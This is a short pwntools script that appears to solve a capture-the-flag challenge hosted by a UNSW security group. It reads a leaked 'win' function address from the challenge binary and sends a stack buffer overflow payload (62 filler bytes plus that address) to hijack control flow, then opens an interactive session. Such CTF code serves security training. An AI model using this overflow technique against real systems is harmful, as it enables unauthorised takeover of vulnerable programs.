from pwn import *

#context.log_level = "debug"
remote_conn = True

IP = "pwn.ctf.unswsecurity.com"
PORT = "5002"
IP = "127.0.0.1"
PORT = "9998"
FILENAME = "./src/vuln"

#libc = ELF("")
#ld = ELF("")

if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("office: ")
win_addr = int(p.recvline()[:-1], 16)
win_addr = pack(win_addr)
log.info(str(win_addr))

payload = b"A"*62 + win_addr
p.sendline(payload)

p.interactive()
